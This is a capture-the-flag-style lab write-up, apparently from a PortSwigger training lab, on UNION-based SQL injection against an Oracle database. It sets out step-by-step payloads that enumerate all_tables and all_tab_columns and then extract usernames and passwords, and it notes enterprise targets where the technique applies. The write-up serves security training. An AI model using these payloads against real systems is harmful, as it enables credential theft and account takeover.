# Lab 10 — SQL Injection Attack: Listing the Database Contents on Oracle

**Difficulty:** Practitioner
**Technique:** UNION-based SQLi — full database enumeration using Oracle system tables
**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

---

## Vulnerability

The product category filter is vulnerable to UNION-based SQL injection. This lab repeats the full enumeration methodology from Lab 09 — but on an Oracle database, which does not have `information_schema`. Oracle uses its own system tables (`all_tables` and `all_tab_columns`) to store metadata about the database structure, and every query requires a `FROM` clause as covered in Lab 07.

---

## Steps Taken

1. Confirmed SQLi and established that the query returns 2 text-compatible columns
2. Identified the database as Oracle (mandatory FROM clause required, as seen in Lab 07)
3. Queried `all_tables` to list all tables in the database
4. Identified a table with a name suggesting user credential storage
5. Queried `all_tab_columns` to find the column names inside that table
6. Extracted usernames and passwords from the identified table using a targeted UNION query
7. Used the administrator credentials to log in and complete the lab

---

## Payloads Used

### Step 1 — List all tables
```
?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**What this does:**
- `all_tables` is Oracle's system table containing metadata about every table in the database
- Equivalent to `information_schema.tables` on MySQL/MSSQL/PostgreSQL
- Returns all table names disguised as product data in the response

**Response reveals something like:**
```
USERS_ABCDEF
PRODUCTS
ORDERS
```

### Step 2 — List columns in the target table
```
?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

**What this does:**
- `all_tab_columns` is Oracle's equivalent of `information_schema.columns`
- Filtered to the specific table identified in Step 1
- Returns all column names — revealing username and password fields

**Important Oracle detail:** table and column names are often stored in **uppercase** by default in Oracle, so the `WHERE` clause filter typically needs to match uppercase exactly.

**Response reveals something like:**
```
USERNAME_HJKL
PASSWORD_MNOP
```

### Step 3 — Extract credentials
```
?category=Gifts'+UNION+SELECT+USERNAME_HJKL,PASSWORD_MNOP+FROM+USERS_ABCDEF--
```

**What this does:**
- Targets the exact table and column names discovered in Steps 1 and 2
- Returns all usernames and passwords directly in the application response

---

## Oracle vs Non-Oracle Enumeration — Side by Side

| Task | Oracle | MySQL / MSSQL / PostgreSQL |
|------|--------|----------------------------|
| List tables | `all_tables` | `information_schema.tables` |
| List columns | `all_tab_columns` | `information_schema.columns` |
| FROM clause required | Always | Only when selecting from a table |
| Dummy table for constants | `dual` | Not needed |
| Default name casing | Uppercase | Usually lowercase |

---

## Real-World Impact

Identical impact to Lab 09 — full database compromise:
- Complete exposure of database structure on an Oracle-based system
- Extraction of all user credentials
- Administrator account takeover
- Demonstrates that the same vulnerability class affects every major database platform, just with different system table names

Oracle databases are commonly used in large enterprise environments (banking, government, healthcare), making this enumeration path especially relevant for real-world high-value targets.

---

## Key Takeaway

The enumeration pattern — tables → columns → data — remains identical across every database platform. Only the system table names change. Oracle's `all_tables` and `all_tab_columns` are the direct equivalents of `information_schema.tables` and `information_schema.columns`. Recognising this pattern means a penetration tester can adapt to any database platform encountered in the field, as long as the platform is correctly fingerprinted first.
